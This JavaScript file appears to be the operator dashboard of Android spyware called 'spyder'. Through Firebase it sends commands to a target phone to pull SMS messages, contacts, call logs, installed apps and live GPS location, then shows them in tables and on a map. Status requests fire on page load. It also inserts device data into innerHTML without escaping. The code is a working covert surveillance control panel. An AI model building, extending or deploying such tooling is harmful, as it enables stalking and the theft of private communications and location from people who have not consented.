
document.getElementById("refreshSiteBtn").addEventListener("click",()=>{
  location.reload();
});

// ✅ Import Firebase Modular SDK (v9+)
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import {
  getDatabase,
  ref,
  set,
  onValue,
  onChildAdded,
  get,
  update
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
import {
  getAuth,
  signOut
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";

// ✅ Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyDvFaH5h4KI3x4e4Vm9mMiwE73vBO0GPl0",
  authDomain: "spyder-7967e.firebaseapp.com",
  databaseURL: "https://spyder-7967e-default-rtdb.firebaseio.com",
  projectId: "spyder-7967e",
  storageBucket: "spyder-7967e.appspot.com",
  messagingSenderId: "100352332121",
  appId: "1:100352332121:web:668d283297679d6a7f3c48"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth();
const userNo = "user1";

// ✅ Logout
document.getElementById("logoutBtn").addEventListener("click", () => {
  signOut(auth).then(() => {
    window.location.href = "login.html";
  });
});

// ✅ Utilities
function displayNoneDashboard() {
  document.querySelector(".dashboard").style.display = "none";
}
function displayBlockDashboard() {
  document.querySelector(".dashboard").style.display = "block";
}

// ✅ Command Sender
function sendCommand(type) {
  const keyMap = {
    getSmsLogs: "sms",
    getContacts: "contacts",
    getCallLogs: "calls",
    getInstalledApps: "installedApps",
    getLocation: "location",
    getBattery: "battery",
    getNetwork: "network",
    getStatus: "status",
    getLastSeen: "lastSeen"
  };

  const path = keyMap[type];
  if (!path) return;

  update(ref(db, `users/${userNo}/${path}`), {
    type,
    timestamp: Date.now()
  });
}
// ✅ Automatically trigger these commands on website load
window.addEventListener("load", () => {
  sendCommand("getStatus");
  sendCommand("getBattery");
  sendCommand("getLastSeen");
});

// // You could also wrap this in a refreshDeviceInfo() function and call it anytime needed. In future in want use of this then ;
// setTimeout(() => {
//   // These values will be updated by onValue(userRef) 
//   sendCommand("getStatus");
//   sendCommand("getBattery");
//   sendCommand("getLastSeen");
// }, 100); // Wait 1 milli after initial load


// ✅ Track Status, Battery, Location, Last Seen
const userRef = ref(db, "users/" + userNo);
onValue(userRef, (snapshot) => {
  const data = snapshot.val();
  if (!data) return;

  
     document.getElementById("deviceStatus").textContent = data.status ? "Online" : "Offline";
     document.getElementById("deviceStatus").className = data.status === "online" ? "status-green" : "status-red";
     document.getElementById("batteryLevel").textContent = data.battery?.percentage + "%";

     const lastSeen = new Date(data.lastSeenTime);
     const timePart = `At ${lastSeen.getHours().toString().padStart(2, '0')}:${lastSeen.getMinutes().toString().padStart(2, '0')}:${lastSeen.getSeconds().toString().padStart(2, '0')}`;
     const datePart = `On ${lastSeen.toDateString()}`;
     document.getElementById("lastSeen").textContent = `${timePart} , ${datePart}`;
  

  if (data.location?.latitude && data.location?.longitude) {
    const lat = data.location.latitude;
    const lng = data.location.longitude;
    liveMarker.setLatLng([lat, lng]);
    map.setView([lat, lng], 16);
    getAddressFromCoords(lat, lng);
  }
});

// ✅ Map Initialization
const map = L.map('map', { zoomControl: true, maxZoom: 19 }).setView([21.4505, 80.2048], 14);
const liveMarker = L.marker([21.4505, 80.2048]).addTo(map);
L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
  attribution: '&copy; Esri — Source: Esri, Maxar',
  maxZoom: 19,
  tileSize: 256,
  zoomOffset: 0
}).addTo(map);

// ✅ Reverse Geocoding
function getAddressFromCoords(lat, lng) {
  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
    .then(res => res.json())
    .then(data => {
      const name = data.display_name || "Unknown";
      liveMarker.bindPopup(`<b>Location:</b><br>${name}`).openPopup();
      document.getElementById("locationInfo").textContent = name;
    })
    .catch(() => {
      liveMarker.bindPopup("Location details not available").openPopup();
    });
}

// ✅ Section Toggle Logic
document.querySelectorAll("#trackLocation").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelector("#status").style.display = "flex";
    displayNoneDashboard();
    sendCommand('getLocation');
    setTimeout(() => map.invalidateSize(), 300);
  });
});
document.querySelectorAll(".crossLocation").forEach(btn => {
  btn.addEventListener("click", () => {
    ["smsLogs", "status", "installedApps", "callLogs", "contactLogs"].forEach(id => {
      document.getElementById(id).style.display = "none";
    });
    displayBlockDashboard();
  });
});

// ✅ Fetch Installed Apps
function fetchInstalledApps() {
  const appsRef = ref(db, `users/${userNo}/installedApps`);
  const tbody = document.getElementById("appsTableBody");
  tbody.innerHTML = "";

  get(appsRef).then(snapshot => {
    if (!snapshot.exists()) return;
    snapshot.forEach(appSnap => {
      const app = appSnap.val();
      tbody.innerHTML += `<tr><td>${app.name}</td><td>${app.package}</td></tr>`;
    });
    showSection("installedApps");
  });
}

// ✅ Fetch Call Logs
function fetchCallLogs() {
  const callRef = ref(db, `users/${userNo}/calls`);
  const tbody = document.getElementById("callTableBody");
  tbody.innerHTML = "";

  get(callRef).then(snapshot => {
    if (!snapshot.exists()) return;
    snapshot.forEach(logSnap => {
      const log = logSnap.val();
      const time = log.time ? new Date(log.time).toLocaleString() : "N/A";
      tbody.innerHTML += `<tr>
        <td>${log.name || "-"}</td>
        <td>${log.number || "-"}</td>
        <td>${log.type || "-"}</td>
        <td>${log.duration || "-"}s</td>
        <td>${time}</td>
      </tr>`;
    });
    showSection("callLogs");
  });
}

// ✅ Fetch Contacts
function fetchContactLogs() {
  const contactRef = ref(db, `users/${userNo}/contacts`);
  const tbody = document.getElementById("contactTableBody");
  tbody.innerHTML = "";

  get(contactRef).then(snapshot => {
    if (!snapshot.exists()) return;
    snapshot.forEach(cSnap => {
      const c = cSnap.val();
      tbody.innerHTML += `<tr><td>${c.name || "-"}</td><td>${c.number || "-"}</td></tr>`;
    });
    showSection("contactLogs");
  });
}

// ✅ Show Section
function showSection(id) {
  displayNoneDashboard();
  document.getElementById(id).style.display = "block";
}

// ✅ Button Listeners
document.getElementById("btnInstalledApps")?.addEventListener("click", () => {
  fetchInstalledApps();
  sendCommand('getInstalledApps');
});
document.getElementById("btnCallLogs")?.addEventListener("click", () => {
  fetchCallLogs();
  sendCommand('getCallLogs');
});
document.getElementById("btnContacts")?.addEventListener("click", () => {
  fetchContactLogs();
  sendCommand('getContacts');
});

// ✅ Append SMS to Table
function appendSMSRow(data) {
  const tbody = document.getElementById("smsTableBody");
  const tr = document.createElement("tr");

  const sender = document.createElement("td");
  sender.textContent = data.from || "Unknown";

  const message = document.createElement("td");
  message.textContent = data.message || "";

  const time = document.createElement("td");
  const date = new Date(data.timestamp || Date.now());
  time.textContent = date.toLocaleString();

  tr.append(sender, message, time);
  tbody.appendChild(tr);
}

// ✅ Realtime SMS Listener (for user1 only)
const smsRef = ref(db, `users/${userNo}/sms`);
onChildAdded(smsRef, (smsSnap) => {
  const sms = smsSnap.val();
  appendSMSRow(sms);
});

// ✅ Display SMS Panel
document.getElementById("smsBtn").addEventListener("click", () => {
  document.getElementById("smsLogs").style.display = "block";
  displayNoneDashboard();
  sendCommand('getSmsLogs'); // ✅ Trigger SMS collection
});
